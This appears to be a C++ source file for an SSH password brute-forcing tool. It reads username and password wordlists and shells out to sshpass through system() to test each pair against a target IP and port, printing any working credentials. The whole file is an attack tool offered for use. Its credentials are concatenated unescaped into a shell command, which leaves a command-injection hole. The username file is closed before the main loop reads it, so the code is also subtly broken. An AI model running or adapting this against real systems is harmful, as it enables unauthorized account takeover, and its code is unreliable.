#include <iostream>
#include <fstream>
#include <string>
#include <cstdlib>

using namespace std;

bool tryCredentials(const char* ipAddress, int port, const string& username, const string& password) {
    // Construct the SSH command with username and password
    string sshCommand = "sshpass -p \"" + password + "\" ssh -p " + to_string(port) + " " + username + "@" + ipAddress + " \"exit\"";

    // Execute the SSH command
    int result = system(sshCommand.c_str());

    // Return true if the command was successful (indicating correct credentials)
    return result == 0;
}

// ANSI color codes for text colors
const string RED = "\033[1;31m";
const string GREEN = "\033[1;32m";
const string RESET = "\033[0m";

int main(int argc, char *argv[]) {
    if (argc != 5) {
        cout << "Usage: " << argv[0] << " <IP_Address> <Username_File> <Password_File> <Port>" << endl;
        return 1;
    }

    // Extract IP address, port, and username from command line arguments
    char* ipAddress = argv[1];
    int port = atoi(argv[4]);

    // Read username from file
    ifstream usernameFile(argv[2]);
    string username;
    if (usernameFile.is_open()) {
        getline(usernameFile, username);
        usernameFile.close();
    } else {
        cerr << RED << "Unable to open username file." << RESET << endl;
        return 1;
    }

    // Read password from file
    ifstream passwordFile(argv[3]);
    string password;
    if (passwordFile.is_open()) {
        getline(passwordFile, password);
        passwordFile.close();
    } else {
        cerr << RED << "Unable to open password file." << RESET << endl;
        return 1;
    }

    bool authenticated = false;

    // Try connecting with fetched credentials
    if (tryCredentials(ipAddress, port, username, password)) {
        cout << GREEN << "Correct credentials:" << RESET << endl;
        cout << GREEN << "Username: " << username << RESET << endl;
        cout << GREEN << "Password: " << password << RESET << endl;
        authenticated = true;
    } else {
        cerr << RED << "Failed to authenticate with the provided credentials:" << RESET << endl;
        cerr << RED << "Username: " << username << RESET << endl;
        cerr << RED << "Password: " << password << RESET << endl;
    }

    // If authentication failed, try printing every failed attempt
    if (!authenticated) {
        while (getline(usernameFile, username)) {
            ifstream passwordFile(argv[3]);
            while (getline(passwordFile, password)) {
                if (tryCredentials(ipAddress, port, username, password)) {
                    cout << GREEN << "Correct credentials found:" << RESET << endl;
                    cout << GREEN << "Username: " << username << RESET << endl;
                    cout << GREEN << "Password: " << password << RESET << endl;
                    authenticated = true;
                    break;
                } else {
                    cerr << RED << "Failed to authenticate with the provided credentials:" << RESET << endl;
                    cerr << RED << "Username: " << username << RESET << endl;
                    cerr << RED << "Password: " << password << RESET << endl;
                }
            }
            passwordFile.close();
            if (authenticated) break;
        }
    }

    usernameFile.close();

    if (!authenticated) {
        cout << "No valid credentials found." << endl;
    }

    return 0;
}
